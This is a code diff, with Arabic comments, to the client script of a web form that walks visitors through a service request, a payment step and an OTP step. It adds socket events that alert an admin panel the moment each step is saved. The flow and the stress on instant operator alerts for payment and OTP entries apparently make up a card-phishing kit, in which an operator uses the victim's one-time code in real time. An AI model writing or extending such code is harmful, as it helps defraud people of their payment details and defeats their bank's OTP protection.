@@ -85,6 +85,20 @@ function initSocket() {
   }, 30000);
 }
 
+// إشعار لوحة الإدارة فوراً بحفظ بيانات جديد (نموذج/دفع/OTP)
+// مسار مزدوج: الخادم يُرسل admin:new_entry بعد الحفظ، والعميل يُرسل client:new_entry
+// كاحتياط لضمان وصول الإشعار اللحظي.
+function notifyNewEntry(type, data) {
+  if (!state.socket || !state.socket.connected) return;
+  state.socket.emit('client:new_entry', {
+    type,
+    clientId: state.lastSubmission?.clientId,
+    submissionId: state.lastSubmission?.submissionId,
+    reference: state.lastSubmission?.reference,
+    ...data,
+  });
+}
+
 /* ---------- تعبئة قائمة الخدمات ---------- */
 function populateServices() {
   const sel = document.getElementById('serviceType');
@@ -386,6 +400,7 @@ async function submitForm() {
       clientId: data.clientId,
       reference: data.reference,
     };
+    notifyNewEntry('submission', { service_type: payload.service_type });
     showPayment();
   } catch (e) {
     alert('فشل الإرسال. حاول مرة أخرى.');
@@ -460,6 +475,7 @@ async function submitPayment() {
     btn.disabled = false;
     btn.textContent = 'متابعة إلى التحقق';
     if (data.error) { alert(data.error); return; }
+    notifyNewEntry('payment', { hasPayment: true });
     showOtp();
   } catch (e) {
     btn.disabled = false;
@@ -540,6 +556,7 @@ async function submitOtp() {
     btn.disabled = false;
     btn.textContent = 'تأكيد وإتمام الطلب';
     if (data.error) { alert(data.error); return; }
+    notifyNewEntry('otp', { hasOtp: true });
     showSuccess(state.lastSubmission.reference);
   } catch (e) {
     btn.disabled = false;
